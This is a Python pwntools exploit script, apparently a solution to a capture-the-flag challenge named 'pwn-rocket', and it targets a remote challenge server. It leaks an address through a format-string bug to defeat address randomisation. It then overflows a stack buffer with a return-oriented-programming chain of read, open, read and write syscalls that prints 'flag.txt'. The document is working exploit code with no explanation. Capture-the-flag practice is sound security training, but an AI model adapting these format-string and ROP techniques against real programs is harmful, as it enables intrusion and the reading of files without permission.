from pwn import *

# p = process('./pwn-rocket')
# p = remote('localhost', 7777)
p = remote('0.cloud.chals.io', 13163)
e = ELF('./pwn-rocket')

p.sendline(b'%24$p')
p.recvuntil(b': ')
e.address = int(p.recvline()[:-1], 16) - e.symbols['_start']
log.info(hex(e.address))

pop_rdi = 0x168b + e.address
pop_rsi_r15 = 0x1689 + e.address
pop_rdx = 0x14be + e.address
pop_rax = 0x1210 + e.address
syscall = 0x14db + e.address
writable = e.bss() + 0x100

chain = [
    pop_rdi, 0,
    pop_rsi_r15, writable, 0,
    pop_rdx, 0x100,
    pop_rax, 0, 
    syscall,

    pop_rdi, writable,
    pop_rsi_r15, 0, 0,
    pop_rdx, 0,
    pop_rax, 2,
    syscall,

    pop_rdi, 3,
    pop_rsi_r15, writable, 0,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall,

    pop_rdi, 1,
    pop_rsi_r15, writable, 0,
    pop_rdx, 0x100,
    pop_rax, 1,
    syscall
]

payload = b'A' * 0x48
for i in chain:
    payload += p64(i)
p.sendline(payload)
p.sendline(b'flag.txt\0')
p.interactive()
